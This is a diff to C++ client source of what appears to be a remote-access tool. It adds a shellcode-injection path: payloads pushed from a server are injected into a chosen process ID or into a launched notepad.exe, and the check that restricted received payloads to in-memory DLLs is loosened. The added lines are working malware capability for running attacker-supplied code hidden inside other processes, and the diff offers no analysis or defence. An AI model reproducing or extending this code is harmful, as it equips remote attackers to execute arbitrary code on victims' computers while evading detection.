@@ -16,6 +16,7 @@
 #include "IOCPUDPClient.h"
 #include "IOCPKCPClient.h"
 #include "auto_start.h"
+#include "ShellcodeInj.h"
 
 // UDP 协议仅能针对小包数据，且数据没有时序关联
 IOCPClient* NewNetClient(CONNECT_ADDRESS* conn, State& bExit, const std::string& publicIP, bool exit_while_disconnect)
@@ -195,7 +196,13 @@ DWORD WINAPI ExecuteDLLProc(LPVOID param)
             PTHREAD_START_ROUTINE proc = (PTHREAD_START_ROUTINE)runner->GetProcAddress(module, "run");
             Mprintf("MemoryGetProcAddress '%s' %s\n", info.Name, proc ? "success" : "failed");
             if (proc) {
-                proc(&pThread);
+                if (info.RunType == MEMORYDLL)
+                    proc(&pThread);
+                else if (info.RunType == SHELLCODE){
+					ShellcodeInj inj(dll->buffer, info.Size, "run", &pThread, sizeof(PluginParam));
+                    if (info.Pid < 0) info.Pid = GetCurrentProcessId();
+                    bool ret = info.Pid ? inj.InjectProcess(info.Pid) : inj.InjectProcess("notepad.exe", true);
+                }
             } else {
                 while (S_CLIENT_EXIT != *pThread.Exit)
                     Sleep(1000);
@@ -503,7 +510,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
             find = m_MemDLL.find(md5);
         }
         BYTE* data = find != m_MemDLL.end() ? find->second.data() : NULL;
-        if (info->Size == ulLength - sz && info->RunType == MEMORYDLL) {
+        if (info->Size == ulLength - sz) {
             if (md5[0]) {
                 m_MemDLL[md5] = std::vector<BYTE>(szBuffer + sz, szBuffer + sz + info->Size);
                 iniFile cfg(CLIENT_PATH);
